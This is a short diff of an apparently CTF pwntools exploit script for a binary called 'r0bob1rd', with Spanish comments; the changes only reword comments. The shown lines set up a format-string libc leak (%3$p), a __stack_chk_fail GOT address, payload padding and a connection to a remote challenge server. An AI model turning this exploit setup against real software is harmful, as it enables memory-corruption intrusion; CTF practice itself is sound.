@@ -3,7 +3,7 @@ import re
 
 STACK_CHK_FAIL_GOT = 0x602028
 MAIN               = 0x400c0f
-OFFSET_LIBC        = 0x10E077      # leak(%3$p) - libc_base, el que ya calculaste
+OFFSET_LIBC        = 0x10E077      # leak(%3$p) - libc_base
 
 filename = "./r0bob1rd"
 context.update(arch='amd64', os='linux')
@@ -15,7 +15,7 @@ libc   = ELF("./glibc/libc.so.6", checksec=False)   # la libc del reto
 
 io = remote("154.57.164.72", 30272)
 
-offset = 8                         # tu buffer arranca en la posición 8
+offset = 8                         # el buffer arranca en la posición 8
 
 def prepare(payload):
     return payload + b"A" * (104 - len(payload))
